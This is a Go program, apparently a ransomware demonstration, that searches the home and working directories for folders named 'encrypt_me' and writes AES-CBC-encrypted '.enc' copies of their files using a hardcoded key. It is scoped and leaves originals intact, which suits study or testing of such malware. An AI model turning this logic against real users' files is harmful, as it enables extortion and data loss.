package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"

	"github.com/charmbracelet/log"
)

var (
	logger *log.Logger
	key    []byte
)

func main() {
	key = []byte("ifyouforgetthiskeyyoucantdecrypt")
	logger = log.New(os.Stdout)
	logger.SetPrefix("[Main]")

	_flag_debug := os.Getenv("DEBUG")
	switch _flag_debug {
	case "true":
		fallthrough
	case "1":
		logger.SetLevel(log.DebugLevel)
		logger.Debug("DEBUG Mode Set")
	default:
		logger.SetLevel(log.InfoLevel)
	}

	if len(os.Args) >= 1 {
		logger.Debug(os.Args)
	}

	valid_dirs := make([]string, 0)

	home_dir, err := os.UserHomeDir()
	if err != nil || home_dir == "" {
		logger.Errorf("Unable to get handle to home_dir: %v", err)
	} else {
		valid_dirs = append(valid_dirs, home_dir)
	}

	current_dir, err := os.Getwd()
	if err != nil || current_dir == "" {
		logger.Errorf("Unable to get handle to home_dir: %v", err)
	} else {
		valid_dirs = append(valid_dirs, current_dir)
	}

	for _, p := range valid_dirs {
		err := filepath.Walk(p, func(path string, info fs.FileInfo, err error) error {
			if err != nil {
				logger.Errorf("Failed to access path %q: %v\n", path, err)
				return err
			}
			if !info.IsDir() || info.Name() != "encrypt_me" {
				return nil
			}
			return cryptWalk(path)
		})
		if err != nil {
			logger.Errorf("%v", err)
		}
	}

	logger.Infof("Executing \"totally safe program\" in: [%v]", strings.Join(valid_dirs, " ; "))
}

func cryptWalk(path string) error {
	return filepath.Walk(path, func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			logger.Errorf("Failed to access path %q: %v\n", path, err)
			return err
		}
		logger.Debugf("visited file or dir: %q\n", path)
		if info.Mode().IsRegular() {
			encrypt_file(path, key)
		}
		return nil
	})
}

func encrypt_file(path string, key []byte) error {
	plaintext, err := os.ReadFile(path)
	plaintext = Pad(plaintext, aes.BlockSize)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return err
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext[aes.BlockSize:], plaintext)

	return os.WriteFile(path+".enc", ciphertext, 0644)
}

func Pad(data []byte, blockSize int) []byte {
	n := blockSize - len(data)%blockSize
	padding := bytes.Repeat([]byte{byte(n)}, n)
	return append(data, padding...)
}
